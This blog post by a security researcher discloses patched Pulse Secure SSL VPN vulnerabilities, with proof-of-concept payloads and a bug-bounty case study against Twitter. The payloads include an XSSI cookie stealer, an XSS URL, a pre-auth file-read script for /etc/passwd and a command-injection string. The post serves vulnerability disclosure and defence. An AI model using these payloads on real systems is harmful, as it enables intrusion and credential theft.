---
source: orange-tsai
source_url: https://blog.orange.tw/posts/2019-09-attacking-ssl-vpn-part-3-golden-pulse-secure-rce-chain/
title: "Attacking SSL VPN - Part 3: The Golden Pulse Secure SSL VPN RCE Chain, with Twitter as Case Study! | Orange Tsai"
author: "Orange Tsai"
published: 2019-09-01T16:00:00.000Z
description: "Author: Orange Tsai(@orange_8361) and Meh Chang(@mehqq_) Hi, this is the last part of Attacking SSL VPN series. If you haven’t read previous articles yet, here are the quick links for you: Infi"
---

* * *

![preview](https://blog.orange.tw/posts/2019-09-attacking-ssl-vpn-part-3-golden-pulse-secure-rce-chain/96945a638e4d2cbf-01.png)

_Author: Orange Tsai( [@orange\_8361](https://twitter.com/orange_8361)) and Meh Chang( [@mehqq\_](https://twitter.com/mehqq_))_

Hi, this is the last part of Attacking SSL VPN series. If you haven’t read previous articles yet, here are the quick links for you:

- [Infiltrating Corporate Intranet Like NSA: Pre-auth RCE on Leading SSL VPNs](https://i.blackhat.com/USA-19/Wednesday/us-19-Tsai-Infiltrating-Corporate-Intranet-Like-NSA.pdf)
- [Attacking SSL VPN - Part 1: PreAuth RCE on Palo Alto GlobalProtect, with Uber as Case Study!](https://blog.orange.tw/2019/07/attacking-ssl-vpn-part-1-preauth-rce-on-palo-alto.html)
- [Attacking SSL VPN - Part 2: Breaking the Fortigate SSL VPN](https://blog.orange.tw/2019/08/attacking-ssl-vpn-part-2-breaking-the-fortigate-ssl-vpn.html)

After we published our research at Black Hat, due to its great severity and huge impacts, it got lots of attention and discussions. Many people desire first-hand news and wonder when the exploit(especially the Pulse Secure preAuth one) will be released.

We also discussed this internally. Actually, we could simply drop the whole exploits without any concern and acquire plenty of media exposures. However, as a SECURITY firm, our responsibility is to make the world more secure. So we decided to postpone the public disclosure to give the world more time to apply the patches!

Unfortunately, the exploits were revealed by someone else. They can be easily found on GitHub[\[1\]](https://github.com/milo2012/CVE-2018-13379) [\[2\]](https://github.com/milo2012/CVE-2018-13382) [\[3\]](https://github.com/projectzeroindia/CVE-2019-11510) and exploit-db[\[1\]](https://www.exploit-db.com/exploits/47297). Honestly, we couldn’t say they are wrong, because the bugs are absolutely fixed several months ago, and they spent their time differing/reversing/reproducing. But it’s indeed a worth discussing question to the security community: if you have a nuclear level weapon, when is it ready for public disclosure?

We heard about more than 25 bug bounty programs are exploited. From the statistics of [Bad Packet](https://badpackets.net/over-14500-pulse-secure-vpn-endpoints-vulnerable-to-cve-2019-11510/), numerous Fortune 500, U.S. military, governments, financial institutions and universities are also affected by this. There are even [10 NASA servers exposed for this bug](https://twitter.com/sherlocksecure/status/1164492373591642112). So, these premature public disclosures indeed force these entities to upgrade their SSL VPN, this is the good part.

On the other hand, the bad part is that there is an increasing number of [botnets](https://www.securityweek.com/hackers-target-vulnerabilities-fortinet-pulse-secure-products) scanning the Internet in the meanwhile. An [intelligence](https://twitter.com/GossiTheDog/status/1167170305577689091) also points out that there is already a China APT group exploiting this bug. This is such an Internet disaster. Apparently, the world is not ready yet. So, if you haven’t updated your Palo Alto, Fortinet or Pulse Secure SSL VPN, please update it ASAP!

# [About Pulse Secure](https://blog.orange.tw/posts/2019-09-attacking-ssl-vpn-part-3-golden-pulse-secure-rce-chain/\#About-Pulse-Secure "About Pulse Secure") About Pulse Secure

Pulse Secure is the market leader of SSL VPN which provides professional secure access solutions for Hybrid IT. Pulse Secure has been in our research queue for a long time because it was a [critical infrastructure of Google](https://archive.li/8pzwf), which is one of our long-term targets. However, Google applies the Zero Trust security model, and therefore the VPN is removed now.

![](https://blog.orange.tw/posts/2019-09-attacking-ssl-vpn-part-3-golden-pulse-secure-rce-chain/cb977e3504a4b3ac-02.png)

We started to review Pulse Secure in mid-December last year. In the first 2 months, we got nothing. Pulse Secure has a good coding style and security awareness so that it’s hard to find trivial bugs. Here is an interesting comparison, we found the arbitrary file reading [CVE-2018-13379](https://fortiguard.com/psirt/FG-IR-18-384) on FortiGate SSL VPN on our first research day…

Pulse Secure is also a Perl lover, and writes lots of Perl extensions in C++. The interaction between Perl and C++ is also confusing to us, but we got more familiar with it while we paid more time digging in it. Finally, we got the first blood on **March 8, 2019**! It’s a stack-based overflow on the management interface! Although this bug isn’t that useful, our research progress got on track since that, and we uncovered more and more bugs.

We reported all of our finding to Pulse Secure PSIRT on **March 22, 2019**. Their response is very quick and they take these vulnerabilities seriously! After several conference calls with Pulse Secure, **they fixed all bugs just within a month**, and released the patches on **April 24, 2019**. You can check the detailed [security advisory](https://kb.pulsesecure.net/articles/Pulse_Security_Advisories/SA44101/)!

It’s a great time to work with Pulse Secure. From our perspective, Pulse Secure is the most responsible vendor among all SSL VPN vendors we have reported bugs to!

# [Vulnerabilities](https://blog.orange.tw/posts/2019-09-attacking-ssl-vpn-part-3-golden-pulse-secure-rce-chain/\#Vulnerabilities "Vulnerabilities") Vulnerabilities

We have found 7 vulnerabilities in total. Here is the list. We will introduce each one but focus on the CVE-2019-11510 and CVE-2019-11539 more.

- CVE-2019-11510 - Pre-auth Arbitrary File Reading
- CVE-2019-11542 - Post-auth(admin) Stack Buffer Overflow
- CVE-2019-11539 - Post-auth(admin) Command Injection
- CVE-2019-11538 - Post-auth(user) Arbitrary File Reading via NFS
- CVE-2019-11508 - Post-auth(user) Arbitrary File Writing via NFS
- CVE-2019-11540 - Post-auth Cross-Site Script Inclusion
- CVE-2019-11507 - Post-auth Cross-Site Scripting

And here are affected versions:

- Pulse Connect Secure 9.0R1 - 9.0R3.3
- Pulse Connect Secure 8.3R1 - 8.3R7
- Pulse Connect Secure 8.2R1 - 8.2R12
- Pulse Connect Secure 8.1R1 - 8.1R15
- Pulse Policy Secure 9.0R1 - 9.0R3.3
- Pulse Policy Secure 5.4R1 - 5.4R7
- Pulse Policy Secure 5.3R1 - 5.3R12
- Pulse Policy Secure 5.2R1 - 5.2R12
- Pulse Policy Secure 5.1R1 - 5.1R15

## [CVE-2019-11540: Cross-Site Script Inclusion](https://blog.orange.tw/posts/2019-09-attacking-ssl-vpn-part-3-golden-pulse-secure-rce-chain/\#CVE-2019-11540-Cross-Site-Script-Inclusion "CVE-2019-11540: Cross-Site Script Inclusion") CVE-2019-11540: Cross-Site Script Inclusion

The script `/dana/cs/cs.cgi` renders the session ID in JavaScript. As the content-type is set to `application/x-javascript`, we could perform the XSSI attack to steal the DSID cookie!

Even worse, the CSRF protection in Pulse Secure SSL VPN is based on the DSID. With this XSSI, we can bypass all the CSRF protection!

PoC:

|     |     |
| --- | --- |
| ```<br>1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>``` | ```<br><!-- http://attacker/malicious.html --><br><script src="https://sslvpn/dana/cs/cs.cgi?action=appletobj"></script><br><script><br>    window.onload = function() {<br>        window.document.writeln = function (msg) {<br>            if (msg.indexOf("DSID") >= 0) alert(msg)<br>        }<br>        ReplaceContent()<br>    }<br></script><br>``` |

## [CVE-2019-11507: Cross-Site Scripting](https://blog.orange.tw/posts/2019-09-attacking-ssl-vpn-part-3-golden-pulse-secure-rce-chain/\#CVE-2019-11507-Cross-Site-Scripting "CVE-2019-11507: Cross-Site Scripting") CVE-2019-11507: Cross-Site Scripting

There is a CRLF Injection in `/dana/home/cts_get_ica.cgi`. Due to the injection, we can forge arbitrary HTTP headers and inject malicious HTML contents.

PoC:

|     |     |
| --- | --- |
| ```<br>1<br>2<br>3<br>4<br>``` | ```<br>https://sslvpn/dana/home/cts_get_ica.cgi<br>?bm_id=x<br>&vdi=1<br>&appname=aa%0d%0aContent-Type::text/html%0d%0aContent-Disposition::inline%0d%0aaa:bb<svg/onload=alert(document.domain)><br>``` |

## [CVE-2019-11538: Post-auth(user) Arbitrary File Reading via NFS](https://blog.orange.tw/posts/2019-09-attacking-ssl-vpn-part-3-golden-pulse-secure-rce-chain/\#CVE-2019-11538-Post-auth-user-Arbitrary-File-Reading-via-NFS "CVE-2019-11538: Post-auth(user) Arbitrary File Reading via NFS") CVE-2019-11538: Post-auth(user) Arbitrary File Reading via NFS

The following two vulnerabilities (CVE-2019-11538 and CVE-2019-11508) do not affect default configurations. It appears only if the admin configures the NFS sharing for the VPN users.

If an attacker can control any files on remote NFS server, he can just create a symbolic link to any file, such as `/etc/passwd`, and read it from web interface. The root cause is that the implementation of NFS mounts the remote server as a real Linux directory, and the script `/dana/fb/nfs/nfb.cgi` does not check whether the accessed file is a symlink or not!

## [CVE-2019-11508: Post-auth(user) Arbitrary File Writing via NFS](https://blog.orange.tw/posts/2019-09-attacking-ssl-vpn-part-3-golden-pulse-secure-rce-chain/\#CVE-2019-11508-Post-auth-user-Arbitrary-File-Writing-via-NFS "CVE-2019-11508: Post-auth(user) Arbitrary File Writing via NFS") CVE-2019-11508: Post-auth(user) Arbitrary File Writing via NFS

This one is a little bit similar to the previous one, but with a different attack vector!

When the attacker uploads a ZIP file to the NFS through the web interface, the script `/dana/fb/nfs/nu.cgi` does not sanitize the filename in the ZIP. Therefore, an attacker can build a malicious ZIP file and traverse the path with `../` in the filename! Once Pulse Secure decompresses, the attacker can upload whatever he wants to whatever path!

## [CVE-2019-11542: Post-auth(admin) Stack Buffer Overflow](https://blog.orange.tw/posts/2019-09-attacking-ssl-vpn-part-3-golden-pulse-secure-rce-chain/\#CVE-2019-11542-Post-auth-admin-Stack-Buffer-Overflow "CVE-2019-11542: Post-auth(admin) Stack Buffer Overflow") CVE-2019-11542: Post-auth(admin) Stack Buffer Overflow

There is a stack-based buffer overflow in the following Perl module implementations:

- DSHC::ConsiderForReporting
- DSHC::isSendReasonStringEnabled
- DSHC::getRemedCustomInstructions

These implementations use `sprintf` to concatenate strings without any length check, which leads to the buffer overflow. The bug can be triggered in many places, but here we use `/dana-admin/auth/hc.cgi` as our PoC.

|     |     |
| --- | --- |
| ```<br>1<br>2<br>3<br>``` | ```<br>https://sslvpn/dana-admin/auth/hc.cgi<br>?platform=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA<br>&policyid=0<br>``` |

And you can observed the segment fault from `dmesg`

|     |     |
| --- | --- |
| ```<br>1<br>``` | ```<br>cgi-server[22950]: segfault at 61616161 ip 0000000002a80afd sp 00000000ff9a4d50 error 4 in DSHC.so[2a2f000+87000]<br>``` |

## [CVE-2019-11510: Pre-auth Arbitrary File Reading](https://blog.orange.tw/posts/2019-09-attacking-ssl-vpn-part-3-golden-pulse-secure-rce-chain/\#CVE-2019-11510-Pre-auth-Arbitrary-File-Reading "CVE-2019-11510: Pre-auth Arbitrary File Reading") CVE-2019-11510: Pre-auth Arbitrary File Reading

Actually, this is the most severe bug in this time. It is in the web server implementation. As our slides mentioned, Pulse Secure implements their own web server and architecture stack from scratch. The original path validation is very strict. However, since version 8.2, Pulse Secure introduced a new feature called `HTML5 Access`, it’s a feature used to interact with Telnet, SSH, and RDP by browsers. Thanks to this new feature, the original path validation becomes loose.

In order to handle the static resources, Pulse Secure created a new IF-CONDITION to widen the originally strict path validation. The code wrongly uses the `request->uri` and `request->filepath`, so that we can specify the `/dana/html5acc/guacamole/` in the end of the query string to bypass the validation and make `request->filepath` to any file you want to download!

And it’s worth to mention that in order to read arbitrary files, you must to specify the `/dana/html5acc/guacamole/` in the middle of the path again. Otherwise, you can only download limited file extensions such as .json, .xml or .html.

Due to the exploit is in the wild, there is no longer any concern to show the payload:

|     |     |
| --- | --- |
| ```<br>1<br>2<br>3<br>4<br>``` | ```<br>import requests<br>r = requests.get('https://sslvpn/dana-na/../dana/html5acc/guacamole/../../../../../../etc/passwd?/dana/html5acc/guacamole/')<br>print r.content<br>``` |

![](https://blog.orange.tw/posts/2019-09-attacking-ssl-vpn-part-3-golden-pulse-secure-rce-chain/bcdabc1124cb1566-03.png)

## [CVE-2019-11539: Post-auth(admin) Command Injection](https://blog.orange.tw/posts/2019-09-attacking-ssl-vpn-part-3-golden-pulse-secure-rce-chain/\#CVE-2019-11539-Post-auth-admin-Command-Injection "CVE-2019-11539: Post-auth(admin) Command Injection") CVE-2019-11539: Post-auth(admin) Command Injection

The last one is a command injection on the management interface. We found this vulnerability very early, but could not find a way to exploit it at first. While we were in Vegas, one of my friends told me that he found the same bug before, but he didn’t find a way to exploit it, so he didn’t report to the vendor.

However, we did it, and we exploit it in a very smart way :)

The root cause of this vulnerability is very simple. Here is a code fragment of `/dana-admin/diag/diag.cgi`:

|     |     |
| --- | --- |
| ```<br>1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>``` | ```<br># ...<br>$options = tcpdump_options_syntax_check(CGI::param("options"));<br># ...<br>sub tcpdump_options_syntax_check {<br>  my $options = shift;<br>  return $options if system("$TCPDUMP_COMMAND -d $options >/dev/null 2>&1") == 0;<br>  return undef;<br>}<br>``` |

It’s so obvious and straightforward that everyone can point out there is a command injection at the parameter `options`! However, is it that easy? No!

In order to avoid potential vulnerabilities, Pulse Secure applies lots of hardenings on their products! Such as the system integrity check, read-only filesystem and a module to hook all dangerous Perl invocations like `system`, `open` and `backtick`…

This module is called `DSSAFE.pm`. It implements its own command line parser and re-implements the I/O redirections in Perl. Here is the [code fragments on Gist](https://gist.github.com/orangetw/d8df11b147629bb320e7db903c7e7147).

From the code fragments, you can see it replaces the original `system` and do lots of checks in `__parsecmd`. It also blocks numerous bad characters such as:

|     |     |
| --- | --- |
| ```<br>1<br>``` | ```<br>[\&\*\(\)\{\}\[\]\`\;\|\?\n~<>]<br>``` |

The checks are very strict so that we can not perform any command injection. We imagined several ways to bypass that, and the first thing came out of my mind is the argument injection. We listed all arguments that `TCPDUMP` supports and found that the `-z postrotate-command` may be useful. But the sad thing is that the `TCPDUMP` in Pulse Secure is too old(v3.9.4, Sept 2005) to support this juicy feature, so we failed :(

While examining the system, we found that although the webroot is read-only, we can still abuse the cache mechanism. Pulse Secure caches the template result in `/data/runtime/tmp/tt/` to speed up script rendering. So our next attempt is to write a file into the template cache directory via `-w write-file` argument. However, it seems impossible to write a polyglot file in both PCAP and Perl format.

As it seems we had reached the end of argument injection, we tried to dig deeper into the `DSSFAFE.pm` implementation to see if there is anything we can leverage. Here we found a defect in the command line parser. If we insert an incomplete I/O redirection, the rest of the redirection part will be truncated. Although this is a tiny flaw, it helped us to re-control the I/O redirections! However, the problem that we can’t generate a valid Perl script still bothered us.

We got stuck here, and it’s time to think out of the box. It’s hard to generate a valid Perl script via `STDOUT`, could we just write the Perl by `STDERR`? The answer is yes. When we force the `TCPDUMP` to read a nonexistent-file via `-r read-file`. It shows the error:

> tcpdump: \[filename\]: No such file or directory

It seems we can “ **partially**“ control the error message. Then we tried the filename `print 123#`, and the magic happens!

|     |     |
| --- | --- |
| ```<br>1<br>2<br>3<br>4<br>5<br>``` | ```<br>$ tcpdump -d -r 'print 123#'<br>  tcpdump: print 123#: No such file or directory<br>$ tcpdump -d -r 'print 123#' 2>&1 | perl –<br>  123<br>``` |

The error message becomes a valid Perl script now. Why? OK, let’s have a Perl 101 lesson now!

![](https://blog.orange.tw/posts/2019-09-attacking-ssl-vpn-part-3-golden-pulse-secure-rce-chain/3194694217ce87e9-04.png)

As you can see, Perl supports the GOTO label, so the `tcpdump:` becomes a valid label in Perl. Then, we comment the rest with a hashtag. With this creative trick, we can generate any valid Perl now!

Finally, we use an incomplete I/O symbol `<` to fool the `DSSAFE.pm` command parser and redirect the `STDERR` into the cache directory! Here is the final exploit:

|     |     |
| --- | --- |
| ```<br>1<br>``` | ```<br>-r$x="ls /",system$x# 2>/data/runtime/tmp/tt/setcookie.thtml.ttc < <br>``` |

The concatenated command looks like:

|     |     |
| --- | --- |
| ```<br>1<br>2<br>3<br>4<br>5<br>``` | ```<br>/usr/sbin/tcpdump -d <br> -r'$x="ls /",system$x#'<br> 2>/data/runtime/tmp/tt/setcookie.thtml.ttc < <br> >/dev/null<br> 2>&1<br>``` |

And the generated `setcookie.thtml.ttc` looks like:

|     |     |
| --- | --- |
| ```<br>1<br>``` | ```<br>tcpdump: $x="ls /",system$x#: No such file or directory<br>``` |

Once we have done this, we can just fetch the corresponding page to execute our command:

|     |     |
| --- | --- |
| ```<br>1<br>2<br>3<br>4<br>``` | ```<br>$ curl https://sslvpn/dana-na/auth/setcookie.cgi<br> boot  bin  home  lib64       mnt      opt  proc  sys  usr  var<br> data  etc  lib   lost+found  modules  pkg  sbin  tmp <br> ...<br>``` |

So far, the whole technical part of this command injection is over. However, we think there may be another creative way to exploit this, if you found one, please tell me!

# [The Case Study](https://blog.orange.tw/posts/2019-09-attacking-ssl-vpn-part-3-golden-pulse-secure-rce-chain/\#The-Case-Study "The Case Study") The Case Study

After Pulse Secure patched all the bugs on **April 24, 2019**. We kept monitoring the Internet to measure the response time of each large corporation. Twitter is one of them. They are known for their [bug bounty program](http://hackerone.com/twitter) and nice to hackers. However, it’s improper to exploit a 1-day right after the patch released. So we wait 30 days for Twitter to upgrade their SSL VPN.

![](https://blog.orange.tw/posts/2019-09-attacking-ssl-vpn-part-3-golden-pulse-secure-rce-chain/5a5d46ac1acccf0d-05.png)

We have to say, we were nervous during that time. The first thing we did every morning is to check whether Twitter upgrades their SSL VPN or not! It was an unforgettable time for us :P

We started to hack Twitter on **May 28, 2019**. During this operation, we encounter several obstacles. The first one is, although we can obtain the plaintext password of Twitter staffs, we still can’t log into their SSL VPN because of the Two Factor Authentication. Here we suggest two ways to bypass that. The first one is that we observed Twitter uses the solution from [Duo](https://duo.com/). The [manual](https://duo.com/docs/pulseconnect) mentions:

> The security of your Duo application is tied to the security of your secret key (skey). Secure it as you would any sensitive credential. Don’t share it with unauthorized individuals or email it to anyone under any circumstances!

So if we can extract the secret key from the system, we can leverage the Duo API to bypass the 2FA. However, we found a quicker way to bypass it. Twitter enabled the [Roaming Session](https://kb.pulsesecure.net/articles/Pulse_Secure_Article/KB30329) feature, which is used to enhances mobility and allows a session from multiple IP locations.

Due to this “ **convenient**“ feature, we can just download the session database and forge our cookies to log into their system!

![](https://blog.orange.tw/posts/2019-09-attacking-ssl-vpn-part-3-golden-pulse-secure-rce-chain/0c6877cf8cf48bb5-06.png)

Until now, we are able to access Twitter Intranet. Nevertheless, our goal is to achieve code execution! It sounds more critical than just accessing the Intranet. So we would like to chain our command injection bug(CVE-2019-11539) together. OK, here, we encountered another obstacle. It’s the restricted management interface!

As we mentioned before, our bug is on the management interface. But for the security consideration, most of the corporation disable this interface on public, so we need another way to access the admin page. If you have read our previous article carefully, you may recall the “ **WebVPN**“ feature! WebVPN is a proxy which helps to connect to anywhere. So, let’s connect to itself.

Yes, it’s SSRF! Here we use a small trick to bypass the SSRF protections.

![](https://blog.orange.tw/posts/2019-09-attacking-ssl-vpn-part-3-golden-pulse-secure-rce-chain/ada05c909f7d4443-07.png)

Ahha! Through our SSRF, we can touch the interface now! Then, the last obstacle popped up. We didn’t have any plaintext password of managers. When Perl wants to exchange data with native procedures, such as the Perl extension in C++ or web server, it uses the cache to store data. The problem is, Pulse Secure forgets to clear the sensitive data after exchange, so that’s why we can obtain plaintext passwords in the cache. But practically, most of the managers only log into their system for the first time, so it’s hard to get the manager’s plaintext password. The only thing we got, is the password hash in `sha256(md5_crypt(salt, …))` format…

If you are experienced in cracking hashes, you will know how hard it is. So…

We launched a 72 core AWS to crack that.

![](https://blog.orange.tw/posts/2019-09-attacking-ssl-vpn-part-3-golden-pulse-secure-rce-chain/b6c43ba1094b2d2e-08.png)

We cracked the hash and got the RCE successfully! I think we are lucky because from our observation, there is a very strong password policy on Twitter staffs. But it seems the policy is not applied to the manager. The manager’s password length is only ten, and the first character is **B**. It’s at a very early stage of our cracking queue so that we can crack the hash in 3 hours.

We reported all of our findings to Twitter and got the highest bounty from them. Although we can not prove that, it seems this is the first remote code execution on Twitter! If you are interested in the full report, you can check the [HackerOne link](https://hackerone.com/reports/591295) for more details.

# [Recommendations](https://blog.orange.tw/posts/2019-09-attacking-ssl-vpn-part-3-golden-pulse-secure-rce-chain/\#Recommendations "Recommendations") Recommendations

How to mitigate such attacks? Here we give several recommendations.

The first is the Client-Side Certificate. It’s also the most effective method. Without a valid certificate, the malicious connection will be dropped during SSL negotiation! The second is the Multi-factor Authentication. Although we break the Twitter 2FA this time, with a proper setting, the MFA can still decrease numerous attack surface. Next, enable the full log audit and remember to send to an out-bound log server.

Also, perform your corporate asset inventory regularly and subscribe to the vendor’s security advisory. The most important of all, always keep your system updated!

# [Bonus: Take over all the VPN clients](https://blog.orange.tw/posts/2019-09-attacking-ssl-vpn-part-3-golden-pulse-secure-rce-chain/\#Bonus-Take-over-all-the-VPN-clients "Bonus: Take over all the VPN clients") Bonus: Take over all the VPN clients

Our company, [DEVCORE](https://devco.re/), provides the most professional red team service in Asia. In this bonus part, let’s talk about how to make the red team more **RED**!

We always know that in a red team operation, the personal computer is more valuable! There are several old-school methods to compromise the VPN clients through SSL VPN before, such as the water-hole attack and replacing the VPN agent.

During our research, we found a new attack vector to take over all the clients. It’s the “ **logon script**“ feature. It appears in almost EVERY SSL VPNs, such as OpenVPN, Fortinet, Pulse Secure… and more. It can execute corresponding scripts to mount the network file-system or change the routing table once the VPN connection established.

Due to this “ **hacker-friendly**“ feature, once we got the admin privilege, we can leverage this feature to infect all the VPN clients! Here we use the Pulse Secure as an example, and demonstrate how to not only compromise the SSL VPN but also take over all of your connected clients:

Pulse Secure SSL VPN PreAuth Remote Code Execution with Compromising All the Connected VPN Clients - YouTube

Tap to unmute

[Pulse Secure SSL VPN PreAuth Remote Code Execution with Compromising All the Connected VPN Clients](https://www.youtube.com/watch?v=v7JUMb70ON4) [Orange Tsai](https://www.youtube.com/channel/UCnweRFxfA-xpTbkb83yfBog)

Orange Tsai3.75K subscribers

[Watch on](https://www.youtube.com/watch?v=v7JUMb70ON4)

# [Epilogue](https://blog.orange.tw/posts/2019-09-attacking-ssl-vpn-part-3-golden-pulse-secure-rce-chain/\#Epilogue "Epilogue") Epilogue

OK, here is the end of this Attacking SSL VPN series! From our findings, SSL VPN is such a huge attack surface with few security researchers digging into. Apparently, it deserves more attention. We hope this kind of series can encourage other researchers to engage in this field and enhance the security of enterprises!

Thanks to all guys we met, co-worked and cooperated. We will publish more innovative researches in the future :)